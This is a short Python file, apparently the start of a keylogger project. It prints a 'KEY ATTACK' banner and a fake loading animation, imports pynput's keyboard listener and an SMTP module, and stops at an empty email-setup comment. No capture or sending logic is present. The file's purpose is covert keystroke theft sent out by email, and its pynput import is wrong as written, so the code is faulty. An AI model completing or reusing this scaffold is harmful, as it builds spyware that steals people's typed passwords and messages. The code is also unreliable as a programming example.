import itertools
import threading
import time
import sys

import getpass
import smtpd
from pynput import Key, Listener

# f = open("F:\Projects\Keylogger\logo.txt", "r")
print('''
 ██ ▄█▀▓█████ ▓██   ██▓    ▄▄▄      ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀
 ██▄█▒ ▓█   ▀  ▒██  ██▒   ▒████▄    ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
▓███▄░ ▒███     ▒██ ██░   ▒██  ▀█▄  ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
▓██ █▄ ▒▓█  ▄   ░ ▐██▓░   ░██▄▄▄▄██ ░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
▒██▒ █▄░▒████▒  ░ ██▒▓░    ▓█   ▓██▒  ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
▒ ▒▒ ▓▒░░ ▒░ ░   ██▒▒▒     ▒▒   ▓▒█░  ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
░ ░▒ ▒░ ░ ░  ░ ▓██ ░▒░      ▒   ▒▒ ░    ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
░ ░░ ░    ░    ▒ ▒ ░░       ░   ▒     ░        ░        ░   ▒   ░        ░ ░░ ░ 
░  ░      ░  ░ ░ ░              ░  ░                        ░  ░░ ░      ░  ░   
               ░ ░                                              ░               
''')


done = False
#here is the animation
def animate():
    for c in itertools.cycle([ '█   ', '▓█  ', '▒▓█ ', '░▒▓█', ' ░▒▓', '  ▒▓', '   ▒', '    ', '    ' ]):
        if done:
            break
        sys.stdout.write('\rLoading...   ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!             ')

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(5)
done = True


#Email setup


